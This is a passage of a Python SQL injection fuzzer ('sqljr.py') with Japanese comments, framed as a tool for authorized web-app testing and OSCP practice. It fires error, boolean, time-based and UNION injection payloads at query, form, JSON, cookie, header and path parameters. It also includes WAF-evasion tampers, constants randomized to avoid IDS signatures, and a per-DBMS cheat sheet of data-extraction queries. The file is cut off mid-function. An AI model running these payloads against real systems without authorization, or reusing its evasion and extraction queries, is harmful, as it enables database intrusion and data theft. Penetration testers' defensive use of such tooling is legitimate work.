#!/usr/bin/env python3
# sqljr.py — SQL injection 注入点ファザー（Burp Intruder Sniper 風）
#
# 用途: 正式に許可された Web アプリ診断 / OSCP 演習のみ。所有 or 契約下の対象限定。
# 動作: 注入点（GET / POST / JSON / Cookie / ヘッダ / パス / * マーカー）に
#        error / boolean / time / union のペイロードを 1 点ずつ注入し、応答の差から
#        注入点・閉じ方（境界）・DBMS を特定する。
#        対応 DBMS: MySQL(MariaDB) / MSSQL / PostgreSQL / Oracle / SQLite
# 方針: 検出まで。データ抽出(dump)は自動では行わない。見つけた注入点については
#        「もしかして これが刺さるかも？」として次に手で打つコマンドを表示するだけ
#        （OSCP は自動エクスプロイトツール禁止。試験で使えるかは OffSec に要確認）。
# 安全: 既定(--risk 1)では OR 型を送らず、GET 以外ではコメント(-- -)で後続の SQL を消す
#        ペイロード（UNION / WAITFOR 含む）も送らない。UPDATE / DELETE に届くと全行に効くため。
#        参照系と分かっている POST（検索・ログイン）は --risk 2 で全ペイロードを送る。
#
# 使い方:
#   python3 sqljr.py -u "http://victim/item?id=1"
#   python3 sqljr.py -u "http://victim/item?id=1*"            # * の位置だけ狙う
#   python3 sqljr.py -u "http://victim/login" -d "user=a&pass=b" --risk 2   # ログインは OR 型が要る
#   python3 sqljr.py -u "http://victim/api" -d '{"id":1}'      # JSON ボディ
#   python3 sqljr.py -r req.txt --proxy http://127.0.0.1:8080  # Burp のリクエスト
#   python3 sqljr.py -u "http://victim/" -c "track=abc" --level 2   # Cookie も検査
#   python3 sqljr.py -u "http://victim/item?id=1" -t T --sleep 5    # time だけ
#   python3 sqljr.py -u "http://victim/item?id=1" -o result.json --log req.jsonl   # 結果と証跡を保存
import argparse
import copy
import html
import datetime
import json
import random
import re
import shlex
import string
import sys
import time
from collections import Counter
from urllib.parse import urlparse, parse_qsl, urlencode, quote, quote_plus

try:
    import requests
except ImportError:
    sys.exit("[!] requests が必要です:  pip install requests")

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

# ── 色 ───────────────────────────────────────────────
G = "\033[32m"; Y = "\033[33m"; R = "\033[31m"; B = "\033[34m"; C = "\033[36m"; M = "\033[35m"; N = "\033[0m"

DBMS_LIST = ["MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite"]
DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# 実行のたびに変わる定数（固定値だと IDS のシグネチャ 1 本で全部落ちるため）
_RND = random.SystemRandom()
_word = lambda n: "".join(_RND.choice(string.ascii_lowercase) for _ in range(n))
NUM_A, NUM_B = _RND.sample(range(11, 97), 2)    # boolean の比較に使う数字
TAG = _word(3)                                  # UNION の表示列を探す目印
ALIAS = _word(5)                                # サブクエリの別名
JUNK = _word(6)                                 # 元の行を返させないための値
WAF_STATUS = (403, 406, 429, 503)               # WAF / レート制限でよく返るステータス

# ── DBMS エラーのシグネチャ（上から順に評価。固有のものを先、Generic を最後）──
_F = re.IGNORECASE | re.DOTALL
ERROR_SIGNATURES = [(n, re.compile(rx, _F)) for n, rx in [
    ("MySQL",      r"SQL syntax.{0,120}?(MySQL|MariaDB)|check the manual that (corresponds to|fits) your (MySQL|MariaDB)"
                   r"|Warning.{0,80}?\Wmysqli?_|MySqlException|valid MySQL result|com\.mysql\.jdbc|MySqlClient\."
                   r"|XPATH syntax error|Unknown column '[^']*' in|MySQLSyntaxErrorException|pymysql\.err|mysql\.connector\.errors"),
    ("MSSQL",      r"Microsoft SQL (Server|Native)|ODBC (SQL Server|Driver \d+ for SQL Server)|Unclosed quotation mark"
                   r"|SQLServer JDBC|OLE DB.{0,80}?SQL Server|Incorrect syntax near|Conversion failed when converting"
                   r"|System\.Data\.SqlClient|com\.microsoft\.sqlserver|\[SQL Server\]|Msg \d+, Level \d+, State"),
    ("PostgreSQL", r"PostgreSQL.{0,80}?ERROR|pg_(query|exec|prepare|send_query)\(\)|PSQLException|org\.postgresql\.util"
                   r"|syntax error at or near|unterminated quoted string at or near|invalid input syntax for"
                   r"|psycopg2?\.(errors|Error|ProgrammingError)|Npgsql\.|PG::SyntaxError"
                   r"|ERROR:\s+(column|relation|operator|function) .{0,80}? does not exist"),
    ("Oracle",     r"ORA-[0-9]{4,5}|DPY-[0-9]{4}|oracledb\.exceptions|Oracle error|quoted string not properly terminated|oracle\.jdbc|OracleException"
                   r"|Warning.{0,80}?\Woci_"),
    ("SQLite",     r"SQLite/JDBCDriver|sqlite3?\.OperationalError|SQLITE_ERROR|SQLite3::(SQLException|query)"
                   r"|unrecognized token:|SQL logic error|near \".{0,80}?\": syntax error|Warning.{0,80}?\Wsqlite_"
                   r"|System\.Data\.SQLite"),
    ("Generic",    r"SQL syntax|syntax error|unterminated (quoted )?string|SQLSTATE\[|quoted string|SQLException"
                   r"|PDOException|ODBC.{0,40}?Driver|database error|DB Error"),
]]

# ── 1) error-based: 構文を壊してエラーを誘発する ──
ERROR_PROBES = ["'", "\"", "`", "\\", "')", "\")", "'\"", "';", "'))"]

# ── 境界（閉じ方）: (接頭辞, 接尾辞)。中身（AND 1=1 / SLEEP 等）と掛け合わせて使う ──
# コメントを使わない（後続の SQL を消さない）ものを先に試す。
BOUNDARIES = [
    ("",    ""),                     # 数値コンテキスト
    ("'",   " AND 'a'='a"),          # クォートで閉じ直す
    ("\"",  " AND \"a\"=\"a"),
    (")",   " AND (7=7"),
    ("')",  " AND ('a'='a"),
    ("'",   "-- -"),
    ("\"",  "-- -"),
    ("",    "-- -"),
    (")",   "-- -"),
    ("')",  "-- -"),
    ("\")", "-- -"),
    ("'))", "-- -"),
    ("))",  "-- -"),
    ("'",   "#"),                    # MySQL の # コメント
    ("",    "#"),
]
# 式コンテキスト（コメントで後ろを消せない / WHERE 句ではない場所）用の境界。
# 条件が偽のときだけ「サブクエリが複数行」のエラーになる式を差し込む。op は空。
#   ORDER BY / GROUP BY の後ろ、INSERT / UPDATE の文字列値、コメントが使えない WHERE に効く
EXPR_BOUNDS = [    # (対象 DBMS, 接頭辞, 接尾辞)。対象 None は MySQL / PostgreSQL / SQLite 共通
    (None,     ",(CASE WHEN (", ") THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)"),
    (None,     "'||(SELECT CASE WHEN (", ") THEN '' ELSE (SELECT 'a' UNION SELECT 'b') END)||'"),
    ("MSSQL",  "'+(SELECT CASE WHEN (", ") THEN '' ELSE (SELECT 'a' UNION SELECT 'b') END)+'"),
    ("Oracle", ",(CASE WHEN (", ") THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)"),
    ("Oracle", "'||(SELECT CASE WHEN (", ") THEN '' ELSE (SELECT 'a' FROM DUAL UNION SELECT 'b' FROM DUAL) END"
               " FROM DUAL)||'"),
]
# time 用の式コンテキスト境界（連結・演算・ORDER BY に埋め込む）。中身は TIME_CORES の inline を使う
TIME_EXPR_BOUNDS = {
    "MySQL":      [("'||(SELECT 1 FROM DUAL WHERE ", ")||'"), ("\"||(SELECT 1 FROM DUAL WHERE ", ")||\""),
                   ("'+(SELECT 1 FROM DUAL WHERE ", ")+'"), (",(SELECT 1 FROM DUAL WHERE ", ")"),
                   ("-(SELECT 0 FROM DUAL WHERE ", ")")],
    "PostgreSQL": [("'||(SELECT '' WHERE ", ")||'"), (",(SELECT 1 WHERE ", ")"), ("-(SELECT 0 WHERE ", ")")],
    "Oracle":     [("'||(SELECT 1 FROM DUAL WHERE ", ")||'"), (",(SELECT 1 FROM DUAL WHERE ", ")"),
                   ("-(SELECT 0 FROM DUAL WHERE ", ")")],
    "SQLite":     [("'||(SELECT '' WHERE ", ")||'"), (",(SELECT 1 WHERE ", ")"), ("-(SELECT 0 WHERE ", ")")],
}

# time / union で境界が未確定のときに試す接頭辞（多い順）
QUICK_PREFIXES = ["'", "", "\"", "')", ")", "\")"]

# ── DBMS 指紋: その DBMS でだけ「真」になる式（boolean で境界が取れた後に使う）──
FINGERPRINTS = [
    ("MySQL",      "CONNECTION_ID()=CONNECTION_ID()"),
    ("MSSQL",      "BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)"),
    ("PostgreSQL", "5::int=5"),
    ("Oracle",     "LENGTH(SYSDATE)=LENGTH(SYSDATE)"),
    ("SQLite",     "sqlite_version()=sqlite_version()"),
]

# ── 3) time-based の中身。inline は「{op} 式」、stack はスタッククエリ ──
#      {t}=秒, {hms}=h:m:s。t=0 を対照（遅延しないはず）として使う
TIME_CORES = {
    "MySQL":      [("inline", "1=(SELECT 1 FROM (SELECT SLEEP({t})){al})"),   # 行数分 sleep しない形
                   ("inline", "SLEEP({t})")],
    "MSSQL":      [("stack",  ";WAITFOR DELAY '{hms}'"),
                   ("stack",  " WAITFOR DELAY '{hms}'")],
    "PostgreSQL": [("inline", "1=(SELECT 1 FROM PG_SLEEP({t}))"),
                   ("stack",  ";SELECT PG_SLEEP({t})")],
    "Oracle":     [("inline", "1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),{t})")],
}
# SQLite に sleep は無いので重い処理で遅延させる。サイズは小さい方から段階的に上げる
SQLITE_HEAVY = "0=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({n}))))"
SQLITE_SIZES = [20000000, 100000000]      # SQLite と分かっているか --risk 2 のときは 300000000 も

# ── 見つけた後に提示するコマンド用の DBMS 別チートシート ──
INFO = {
    "MySQL": dict(
        ver="SELECT @@version", user="SELECT user()", db="SELECT database()",
        tables="SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
        cols="SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>'",
        dump="SELECT group_concat(<COL1>,0x3a,<COL2>) FROM <TABLE>",
        agg_note="（group_concat は既定 1024 バイトで切れる）",
        one="SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT <N>,1",
        err="extractvalue(1,concat(0x7e,({q}),0x7e))",
        chr="ASCII(SUBSTRING(({q}),1,1))",
        timeb=("inline", "IF(({cond}),SLEEP({t}),0)")),
    "MSSQL": dict(
        ver="SELECT @@version", user="SELECT SYSTEM_USER", db="SELECT DB_NAME()",
        tables="SELECT STRING_AGG(name,',') FROM sys.tables",
        cols="SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('<TABLE>')",
        dump="SELECT STRING_AGG(CONCAT(<COL1>,':',<COL2>),',') FROM <TABLE>",
        agg_note="（STRING_AGG は SQL Server 2017 以降。古ければ 1 件ずつ）",
        one="SELECT name FROM sys.tables ORDER BY name OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY",
        err="1=CONVERT(int,({q}))",
        chr="ASCII(SUBSTRING(({q}),1,1))",
        timeb=("stack", ";IF(({cond})) WAITFOR DELAY '{hms}'")),
    "PostgreSQL": dict(
        ver="SELECT version()", user="SELECT current_user", db="SELECT current_database()",
        tables="SELECT string_agg(table_name,',') FROM information_schema.tables "
               "WHERE table_schema NOT IN ('pg_catalog','information_schema')",
        cols="SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='<TABLE>'",
        dump="SELECT string_agg(<COL1>||':'||<COL2>,',') FROM <TABLE>",
        one="SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN "
            "('pg_catalog','information_schema') LIMIT 1 OFFSET <N>",
        err="1=CAST(({q}) AS int)",
        chr="ASCII(SUBSTR(({q}),1,1))",
        timeb=("inline", "1=(CASE WHEN ({cond}) THEN (SELECT 1 FROM PG_SLEEP({t})) ELSE 1 END)")),
    "Oracle": dict(
        ver="SELECT banner FROM v$version WHERE ROWNUM=1", user="SELECT user FROM dual",
        db="SELECT global_name FROM global_name",
        tables="SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables",
        cols="SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns "
             "WHERE table_name='<TABLE>'",
        dump="SELECT LISTAGG(<COL1>||':'||<COL2>,',') WITHIN GROUP (ORDER BY 1) FROM <TABLE>",
        agg_note="（LISTAGG は 4000 バイトを超えるとエラー）",
        one="SELECT table_name FROM (SELECT table_name, ROWNUM r FROM user_tables) WHERE r=<N>+1",
        err="1=CTXSYS.DRITHSX.SN(1,({q}))",
        chr="ASCII(SUBSTR(({q}),1,1))",
        timeb=("inline", "1=(CASE WHEN ({cond}) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),{t}) ELSE 1 END)")),
    "SQLite": dict(
        ver="SELECT sqlite_version()", user="SELECT 'sqlite(ユーザ概念なし)'", db="SELECT file FROM pragma_database_list",
        tables="SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
        cols="SELECT sql FROM sqlite_master WHERE name='<TABLE>'",
        dump="SELECT group_concat(<COL1>||':'||<COL2>) FROM <TABLE>",
        err=None,
        chr="UNICODE(SUBSTR(({q}),1,1))",
        timeb=("inline", "1=(CASE WHEN ({cond}) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 1 END)")),
}


# ── 設定（main で上書き）──
class CFG:
    sleep = 5
    timeout = 20
    marker = "*"
    delay = 0.0
    retries = 1
    risk = 1
    level = 1
    dbms = None
    string = None
    tamper = []
    verbose = False
    count = 0
    blocked = 0         # WAF / レート制限らしき応答の数
    log = None          # --log: 全リクエストを JSONL で残す


SESSION = None
T = None            # 対象リクエストのテンプレート（Target）


# ── tamper（WAF / フィルタ回避用の最低限の変形）──
_KW = re.compile(r"\b(SELECT|UNION|ALL|AND|OR|ORDER|BY|FROM|WHERE|NULL|SLEEP|WAITFOR|DELAY|CASE|WHEN|THEN|ELSE|END"
                 r"|LIKE|CONCAT|IF)\b", re.IGNORECASE)


def _t_space2comment(p):
    tail = ""
    if p.endswith("-- -"):          # 末尾のコメントは空白が必要なので残す
        p, tail = p[:-4], "-- -"
    return p.replace(" ", "/**/") + tail


def _t_randomcase(p):
    return _KW.sub(lambda m: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p)


TAMPERS = {
    "space2comment": _t_space2comment,
    "randomcase": _t_randomcase,
    "doubleurl": lambda p: quote(p, safe=""),       # 二重 URL エンコード
}


def tamper(payload):
    for name in CFG.tamper:
        payload = TAMPERS[name](payload)
    return payload


# ── 対象リクエスト ───────────────────────────────────
class Target:
    def __init__(self):
        self.method = "GET"
        self.url = ""           # scheme://host/path（クエリ無し。path にマーカーを含み得る）
        self.query = []         # [(k, v)]
        self.kind = None        # None / "form" / "json" / "raw"
        self.form = []          # [(k, v)]
        self.json = None
        self.raw = None
        self.headers = {}
        self.cookies = []       # [(k, v)]


def has_header(headers, name):
    return any(k.lower() == name.lower() for k in headers)


def parse_cookie(s):
    out = []
    for part in s.split(";"):
        if "=" in part:
            k, _, v = part.partition("=")
            out.append((k.strip(), v.strip()))      # デコードしない（base64 等を壊さない）
    return out


def parse_request_file(path, https):
    """Burp の「Copy to file」形式の生リクエストを読む。"""
    with open(path, "rb") as f:
        raw = f.read().decode("utf-8", "replace").replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = [l for l in head.split("\n") if l.strip()]
    try:
        method, target = lines[0].split()[:2]
    except (IndexError, ValueError):
        sys.exit("[!] リクエストファイルの 1 行目が読めません: %s" % path)
    headers, host, cookie = {}, "", None
    for l in lines[1:]:
        k, _, v = l.partition(":")
        k, v = k.strip(), v.strip()
        lk = k.lower()
        if lk == "host":
            host = v
        elif lk == "cookie":
            cookie = v
        elif lk not in ("content-length", "connection", "accept-encoding"):
            headers[k] = v
    url = target if target.startswith("http") else "%s://%s%s" % ("https" if https else "http", host, target)
    body = body.rstrip("\n")
    return method.upper(), url, headers, cookie, (body if body else None)


def build_target(args):
    t = Target()
    method, url, headers, cookie, body = None, args.url, {}, args.cookie, args.data
    if args.request:
        method, url, headers, c2, b2 = parse_request_file(args.request, args.https)
        cookie = cookie or c2
        body = body if body is not None else b2
    if not url:
        sys.exit("[!] -u か -r で対象を指定してください。")
    if "://" not in url:
        url = "http://" + url
    for h in args.header or []:
        k, _, v = h.partition(":")
        if k.strip().lower() == "cookie":
            cookie = cookie or v.strip()
        else:
            headers[k.strip()] = v.strip()
    if not has_header(headers, "User-Agent"):
        headers["User-Agent"] = DEFAULT_UA
    pr = urlparse(url)
    t.url = "%s://%s%s" % (pr.scheme, pr.netloc, pr.path or "/")
    t.query = parse_qsl(pr.query, keep_blank_values=True)
    t.headers = headers
    t.cookies = parse_cookie(cookie) if cookie else []

    if body is not None:
        ctype = next((v for k, v in headers.items() if k.lower() == "content-type"), "").lower()
        obj = None
        if "json" in ctype or body.lstrip()[:1] in ("{", "["):
            try:
                obj = json.loads(body)
            except ValueError:
                obj = None
        if obj is not None and isinstance(obj, (dict, list)):
            t.kind, t.json = "json", obj
            if not ctype:
                t.headers["Content-Type"] = "application/json"
        elif "multipart" in ctype or "xml" in ctype or ("=" not in body):
            t.kind, t.raw = "raw", body            # マーカー(*)を置いた箇所だけ検査できる
        else:
            t.kind, t.form = "form", parse_qsl(body, keep_blank_values=True)
            if not ctype:
                t.headers["Content-Type"] = "application/x-www-form-urlencoded"
    t.method = (args.method or method or ("POST" if body is not None else "GET")).upper()

    if CFG.level >= 3:          # ヘッダ注入の対象を用意
        t.headers.setdefault("Referer", t.url.replace(CFG.marker, ""))
        t.headers.setdefault("X-Forwarded-For", "127.0.0.1")
    return t


def json_leaves(obj, path=()):
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield from json_leaves(v, path + (k,))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from json_leaves(v, path + (i,))
    elif isinstance(obj, (str, int, float)) and not isinstance(obj, bool):
        yield path, obj


def json_set(obj, path, value):
    for k in path[:-1]:
        obj = obj[k]
    obj[path[-1]] = value


def json_clean(obj, marker):
    if isinstance(obj, dict):
        return {k: json_clean(v, marker) for k, v in obj.items()}
    if isinstance(obj, list):
        return [json_clean(v, marker) for v in obj]
    if isinstance(obj, str):
        return obj.replace(marker, "")
    return obj


def build_points(t, only_param):
    """注入点の一覧を作る。マーカー(*)がどこかにあれば、その箇所だけを注入点にする。"""
    m = CFG.marker
    cands = []      # (where, key, name, value, 既定で検査するか)

    if m in t.url.split("://", 1)[-1]:
        cands.append(("PATH", None, "(path)", t.url, False))
    for i, (k, v) in enumerate(t.query):
        cands.append(("GET", i, k, v, True))
    for i, (k, v) in enumerate(t.form):
        cands.append(("POST", i, k, v, True))
    if t.kind == "json":
        for path, v in json_leaves(t.json):
            cands.append(("JSON", path, ".".join(str(p) for p in path), str(v), True))
    if t.kind == "raw":
        cands.append(("BODY", None, "(body)", t.raw, False))
    for i, (k, v) in enumerate(t.cookies):
        cands.append(("COOKIE", i, k, v, CFG.level >= 2))
    for k, v in t.headers.items():
        lk = k.lower()
        if lk.startswith("accept") or lk == "content-type":      # */* を誤ってマーカー扱いしない
            continue
        cands.append(("HEADER", k, k, v, CFG.level >= 3 and lk in ("user-agent", "referer", "x-forwarded-for")))

    use_marker = any(m in v for _, _, _, v, _ in cands)
    points = []
    for where, key, name, value, default in cands:
        if use_marker:
            if m not in value:
                continue
            pre, _, post = value.partition(m)       # マーカーの位置に注入する
        else:
            if not default:
                continue
            pre, post = value, ""
        if only_param and name != only_param:
            continue
        points.append({"where": where, "key": key, "name": name, "pre": pre, "post": post.replace(m, "")})
    return points


def null_base(pt):
    """元の行を返さない値（UNION の結果だけを表示させたいときに使う）。"""
    if pt["where"] in ("PATH", "BODY"):
        return None
    return "-1" if re.fullmatch(r"\d*", pt["pre"]) else JUNK


_COOKIE_SAFE = "!#$&'()*+-./:<=>?@[]^_`{|}~\""


def build(pt, payload, base=None):
    """pt の 1 箇所だけ (元値+payload) に差し替えたリクエストを組み立てる。
       返り値: (method, url, headers, body)"""
    m = CFG.marker
    cl = lambda s: s.replace(m, "")
    w, key = pt["where"], pt["key"]
    val = (pt["pre"] if base is None else base) + payload + pt["post"]

    if w == "PATH":
        url = pt["pre"] + quote(payload, safe="") + pt["post"]
    else:
        url = cl(T.url)
    q = [(k, val if (w == "GET" and i == key) else cl(v)) for i, (k, v) in enumerate(T.query)]
    if q:
        url += "?" + urlencode(q)

    headers = {}
    for k, v in T.headers.items():
        if w == "HEADER" and k == key:
            headers[k] = val
        else:
            headers[k] = v if k.lower().startswith("accept") else cl(v)
    if T.cookies:
        cs = []
        for i, (k, v) in enumerate(T.cookies):
            if w == "COOKIE" and i == key:
                v = (pt["pre"] if base is None else base) + quote(payload, safe=_COOKIE_SAFE) + pt["post"]
            else:
                v = cl(v)
            cs.append("%s=%s" % (k, v))
        headers["Cookie"] = "; ".join(cs)

    body = None
    if T.kind == "form":
        body = urlencode([(k, val if (w == "POST" and i == key) else cl(v)) for i, (k, v) in enumerate(T.form)])
    elif T.kind == "json":
        obj = json_clean(copy.deepcopy(T.json), m)
        if w == "JSON":
            json_set(obj, key, val)
        body = json.dumps(obj, ensure_ascii=False)
    elif T.kind == "raw":
        body = val if w == "BODY" else cl(T.raw)
    return T.method, url, headers, body


# ── リクエスト送信 ───────────────────────────────────
class Resp:
    def __init__(self, status, elapsed, body="", location="", timeout=False, error=None):
        self.status, self.elapsed, self.body, self.location = status, elapsed, body, location
        self.timeout, self.error = timeout, error
        self.bad = timeout or error is not None     # 判定に使ってはいけない応答
        self.clean = body
        self.fp = None          # (ステータス, リダイレクト先, トークン列)
        self.cnt = None         # トークンの出現回数
        self.req = None         # 証跡用: 送ったリクエスト
        self.ts = None


_TOK = re.compile(r"[\r\n<>{}\[\],]+")


def strip_reflect(text, payload):
    """応答に反射したペイロードを消す（反射だけで「差がある」と誤判定しないため）。"""
    if not payload or not text:
        return text
    forms = {payload, html.escape(payload), html.escape(payload, quote=False), quote(payload),
             quote_plus(payload), quote(payload, safe=""), json.dumps(payload)[1:-1]}
    for v in sorted(forms, key=len, reverse=True):
        text = text.replace(v, "")
    return text


def send(pt, payload, base=None):
    payload = tamper(payload)
    method, url, headers, body = build(pt, payload, base)
    resp, waited = None, False
    ts = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")
    attempt = 0
    while attempt <= CFG.retries:
        attempt += 1
        if CFG.delay:
            time.sleep(CFG.delay)
        CFG.count += 1
        t0 = time.time()
        try:
            r = SESSION.request(method, url, headers=headers,
                                data=(body.encode("utf-8") if body is not None else None),
                                timeout=CFG.timeout, verify=False, allow_redirects=False)
            resp = Resp(r.status_code, time.time() - t0, r.text, r.headers.get("Location", ""))
            if r.status_code == 429 and not waited:     # レート制限: 一度だけ待って送り直す
                waited = True
                try:
                    wait = min(float(r.headers.get("Retry-After", 3)), 15)
                except ValueError:
                    wait = 3
                time.sleep(wait)
                attempt -= 1
                continue
            break
        except requests.exceptions.Timeout:
            resp = Resp(0, time.time() - t0, timeout=True)
            break                                    # タイムアウトは再送しない
        except (requests.exceptions.RequestException, UnicodeError, ValueError) as e:
            resp = Resp(-1, time.time() - t0, error=str(e))
    resp.clean = strip_reflect(resp.body, payload)
    toks = tuple(x.strip() for x in _TOK.split(resp.clean) if x.strip())
    resp.fp = (resp.status, strip_reflect(resp.location, payload), toks)
    resp.cnt = Counter(toks)
    resp.req = dict(method=method, url=url, headers=headers, body=body)
    resp.ts = ts
    if resp.status in WAF_STATUS:
        CFG.blocked += 1
    if CFG.log:
        CFG.log.write(json.dumps(dict(time=ts, n=CFG.count, method=method, url=url, body=body, status=resp.status,
                                      length=len(resp.body), elapsed=round(resp.elapsed, 3),
                                      timeout=resp.timeout, error=resp.error), ensure_ascii=False) + "\n")
        CFG.log.flush()
    if CFG.verbose:
        tag = "TIMEOUT" if resp.timeout else ("ERR" if resp.error else str(resp.status))
        print("    %s#%-4d %-7s len=%-6d %5.2fs  %s%s" % (B, CFG.count, tag, len(resp.body), resp.elapsed,
                                                       repr((base or "") + payload), N))
    return resp


def detect_dbs(text):
    return [name for name, rx in ERROR_SIGNATURES if rx.search(text or "")]


def token_dist(a, b):
    return sum(((a.cnt - b.cnt) + (b.cnt - a.cnt)).values())


def cond_payload(pre, op, cond, suf):
    """境界に条件式を差し込む。op が空なら式コンテキスト（CASE WHEN の中など）。"""
    return pre + ((" %s " % op) if op else "") + cond + suf


def evidence(r, db=None):
    """報告書の根拠にできる形で、送ったリクエストと応答の要点を残す。"""
    snip = r.clean[:300]
    if db:
        m = dict(ERROR_SIGNATURES)[db].search(r.clean)
        if m:
            snip = r.clean[max(0, m.start() - 80):m.end() + 200]
    return dict(time=r.ts, request=r.req, status=r.status, length=len(r.body), elapsed=round(r.elapsed, 2),
                location=r.location, snippet=snip)


# ── 注入点ごとの検査状態 ─────────────────────────────
class Ctx:
    def __init__(self, pt):
        self.pt = pt
        self.base = None
        self.thr = 0            # ベースライン同士の揺れ（これ以下の差は「同じ」）
        self.base_time = 0.0
        self.base_dbs = set()   # 元からエラー文が出ている場合は差し引く
        self.dbms = CFG.dbms
        self.quote = None       # ' か " のどちらで壊れたか
        self.bound = None       # (接頭辞, 接尾辞, AND/OR)
        self.stack = False
        self.union = None
        self.tref = None        # boolean の「真」応答（UNION の基準に使う）
        self.kinds = set()      # 検出できた手法
        self.hits = []          # JSON 出力用

    def differ(self, a, b):
        """2 つの応答が「意味のある差」を持つか。"""
        if CFG.string:
            return (CFG.string in a.body) != (CFG.string in b.body)
        if a.fp[0] != b.fp[0] or a.fp[1] != b.fp[1]:      # ステータス / リダイレクト先
            return True
        if self.thr == 0:                                 # 静的ページ: 並び順・重複まで含めて完全一致で比べる
            return a.fp[2] != b.fp[2]
        return token_dist(a, b) > self.thr

    def new_db(self, r):
        """ベースラインには無かった DBMS エラーが出ていれば、その名前。"""
        for name in detect_dbs(r.clean):
            if name not in self.base_dbs:
                return name
        return None

    def set_dbms(self, name):
        if name and name != "Generic" and not self.dbms:
            self.dbms = name

    def hit(self, kind, **kw):
        self.kinds.add(kind)
        self.hits.append(dict(type=kind, **kw))


def baseline(ctx):
    rs = [send(ctx.pt, "") for _ in range(3)]
    if any(r.bad for r in rs):
        r = next(r for r in rs if r.bad)
        print("  %s[!] ベースラインの取得に失敗（%s）。この注入点はスキップ。%s"
              % (R, "timeout" if r.timeout else r.error, N))
        return False
    ctx.base = rs[0]
    noise = max(token_dist(a, b) for a in rs for b in rs)
    ctx.thr = noise + noise // 2
    ctx.base_time = max(r.elapsed for r in rs)
    ctx.base_dbs = set(detect_dbs(rs[0].clean))
    if len({r.fp[0] for r in rs}) > 1:
        print("  %s[!] 同じリクエストでステータスが揺れています。boolean の結果は要注意。%s" % (Y, N))
    elif noise:
        print("  %s[i] 動的ページ（揺れ %d トークン）。--string で真の目印を指定すると確実。%s" % (Y, noise, N))
    return True


# ── 1) error-based ───────────────────────────────────
def test_error(ctx):
    seen, found = {}, {}
    for pl in ERROR_PROBES:
        r = send(ctx.pt, pl)
        seen[pl] = r
        if r.bad:
            continue
        db = ctx.new_db(r)
        if db:
            ctx.set_dbms(db)
            ctx.hit("ERROR", payload=pl, dbms=db, evidence=evidence(r, db))
            found.setdefault(db, []).append(pl)
    for db, pls in found.items():
        print("  %s[ERROR ]%s %s のエラー露出 ← %s" % (G, N, db, " ".join(repr(x) for x in pls)))
    for q in ("'", "\""):
        r1 = seen.get(q)
        if not r1 or r1.bad:
            continue
        if ctx.new_db(r1):
            # q で壊れて qq で直るなら、その q が文字列の閉じ。両方壊れるなら数値コンテキスト
            r2 = send(ctx.pt, q + q)
            if not r2.bad and not ctx.new_db(r2):
                ctx.quote = ctx.quote or q
            continue
        # エラー文が出なくても「' で壊れて '' で直る」なら注入の可能性が高い（WAF の遮断は除外）
        if r1.status == ctx.base.status or r1.status in WAF_STATUS:
            continue
        r2 = send(ctx.pt, q + q)
        if not r2.bad and r2.status == ctx.base.status:
            ctx.quote = ctx.quote or q
            ctx.hit("QUOTE", payload=q, status=r1.status, evidence=evidence(r1))
            print("  %s[QUOTE ]%s %s で HTTP %d、%s で HTTP %d に戻る → クォートが SQL に届いている可能性大"
                  % (G, N, repr(q), r1.status, repr(q + q), r2.status))


# ── 2) boolean-based ─────────────────────────────────
def ordered_bounds(ctx):
    bs = [b for b in BOUNDARIES if b[1] != "#" or ctx.dbms in (None, "MySQL")]
    if ctx.quote:           # エラーで壊れたクォートを先に試す
        bs.sort(key=lambda b: not b[0].startswith(ctx.quote))
    return bs


def allow_comment():
    """コメントで後続の SQL を消すペイロード（-- - / # / ORDER BY / UNION / スタック）を送ってよいか。
       UPDATE や DELETE に届くと WHERE が消えて全行に効くので、既定では参照系とみなせる GET だけ。"""
    return CFG.risk >= 2 or T.method in ("GET", "HEAD")


def bool_candidates(ctx):
    """(接頭辞, 接尾辞, op)。AND → OR（--risk 2 のみ）→ 式コンテキストの順。"""
    bounds = [b for b in ordered_bounds(ctx) if allow_comment() or b[1] not in ("-- -", "#")]
    for pre, suf in bounds:
        yield pre, suf, "AND"
    if CFG.risk >= 2:       # OR は UPDATE / DELETE の WHERE に入ると全行に効くので既定では送らない
        for pre, suf in bounds:
            yield pre, suf, "OR"
    for d, pre, suf in EXPR_BOUNDS:
        if (d is None and ctx.dbms not in ("Oracle",)) or (d and ctx.dbms in (None, d)):
            yield pre, suf, ""


def test_boolean(ctx):
    pt = ctx.pt
    for pre, suf, op in bool_candidates(ctx):
        mk = lambda a, b: cond_payload(pre, op, "%d=%d" % (a, b), suf)
        t1, f1 = send(pt, mk(NUM_A, NUM_A)), send(pt, mk(NUM_A, NUM_A + 1))
        if t1.bad or f1.bad or not ctx.differ(t1, f1):
            continue
        # 別の数字でもう一度。真同士・偽同士が一致して初めて確定（偶然の差を排除）
        t2, f2 = send(pt, mk(NUM_B, NUM_B)), send(pt, mk(NUM_B, NUM_B + 1))
        if t2.bad or f2.bad or ctx.differ(t1, t2) or ctx.differ(f1, f2) or not ctx.differ(t2, f2):
